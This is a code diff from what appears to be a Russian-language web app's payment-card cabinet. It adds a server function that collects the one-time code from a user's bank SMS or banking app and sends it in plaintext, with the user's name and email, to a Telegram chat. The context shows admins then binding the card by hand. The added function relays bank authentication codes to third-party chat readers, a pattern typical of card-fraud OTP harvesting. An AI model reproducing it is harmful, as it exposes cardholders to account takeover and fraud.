@@ -101,6 +101,27 @@ export async function requestCardBinding(input: {
     `Держатель: ${escapeTelegram(cardholder)}`,
     `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
     "Привяжите карту в bePaid и подтвердите в админ-панели.",
+  ].join("\n"), { kind: "card", id: created.id })
+
+  revalidatePath("/cabinet/cards")
+  return { ok: true, cards: await listCards(user.id) }
+}
+
+export async function submitCardCode(id: number, code: string): Promise<CardsResult> {
+  const user = await getSessionUser()
+  if (!Number.isInteger(id) || id <= 0) throw new Error("Invalid card")
+  const trimmed = String(code ?? "").trim().replace(/\s+/g, "").slice(0, 20)
+  if (!/^[A-Za-z0-9]{3,20}$/.test(trimmed)) throw new Error("Укажите код из SMS или приложения банка.")
+
+  const [row] = await db.update(paymentCard).set({ status: "pending" })
+    .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, user.id), eq(paymentCard.status, "code_requested")))
+    .returning({ id: paymentCard.id })
+  if (!row) throw new Error("Заявка недоступна для отправки кода.")
+
+  void notifyTelegram([
+    `<b>Код от пользователя для карты #${id}</b>`,
+    `Код: <code>${escapeTelegram(trimmed)}</code>`,
+    `Пользователь: ${escapeTelegram(user.name ?? "")} (${escapeTelegram(user.email)})`,
   ].join("\n"))
 
   revalidatePath("/cabinet/cards")
